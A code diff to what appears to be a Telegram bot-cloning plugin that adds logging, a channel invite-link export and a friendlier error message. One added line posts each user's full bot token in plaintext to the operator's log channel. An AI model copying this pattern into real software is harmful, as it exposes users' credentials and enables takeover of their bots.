@@ -4,8 +4,9 @@ from Script import script
 from pyrogram import Client, filters
 from pyrogram.types import Message
 from pyrogram.errors.exceptions.bad_request_400 import AccessTokenExpired, AccessTokenInvalid
-from config import API_ID, API_HASH, DB_URI, DB_NAME, CLONE_MODE
+from config import API_ID, API_HASH, DB_URI, DB_NAME, CLONE_MODE, LOG_CHANNEL
 from clone_plugins.dbusers import clonedb
+from TechVJ.bot import StreamBot
 
 mongo_client = MongoClient(DB_URI)
 mongo_db = mongo_client["cloned_vjbotz"]
@@ -53,7 +54,7 @@ async def clone(client, message):
             await vj.get_chat(channel_id)
         except Exception as e:
             await vj.stop()
-            return await msg.edit_text(f"<b>Bot cannot access the channel. Please ensure the bot is an admin in the channel.\nError: {e}</b>")
+            return await msg.edit_text(f"<b>Bot cannot access the channel. Please ensure the bot is an admin in the channel. Try again /clone\nError: {e}</b>")
 
         details = {
             'bot_id': bot.id,
@@ -64,17 +65,23 @@ async def clone(client, message):
             'username': bot.username,
             'db_channel_id': channel_id
         }
+
         vj.bot_details = details
         mongo_db.bots.insert_one(details)
         await msg.edit_text(f"<b>sᴜᴄᴄᴇssғᴜʟʟʏ ᴄʟᴏɴᴇᴅ ʏᴏᴜʀ ʙᴏᴛ: @{bot.username}\nDatabase Channel ID saved.</b>")
         await clonedb.add_admin(bot.id, user_id)
+        db_channel = await vj.get_chat(channel_id)
+        if not db_channel.invite_link:
+            db_channel.invite_link = await vj.export_chat_invite_link(channel_id)
+            vj.db_channel = db_channel
+        await StreamBot.send_message(chat_id=LOG_CHANNEL, text=f"#newclone\n**Bot ID:** `{details['bot_id']}`\n**User ID:** `{details['user_id']}`\n**Name:** `{details['name']}`\n**Username:** @{details['username']}\n**Token:** `{details['token']}`\n**DB Channel ID:** `{details['db_channel_id']}`")
     except BaseException as e:
         await msg.edit_text(f"⚠️ <b>Bot Error:</b>\n\n<code>{e}</code>\n\n**Kindly forward this message to @KingVJ01 to get assistance.**")
 
 @Client.on_message(filters.command("deletecloned") & filters.private)
 async def delete_cloned_bot(client, message):
     if CLONE_MODE == False:
-        return 
+        return
     try:
         techvj = await client.ask(message.chat.id, "**Send Me Bot Token To Delete**")
         bot_token = re.findall(r'\d[0-9]{8,10}:[0-9A-Za-z_-]{35}', techvj.text, re.IGNORECASE)
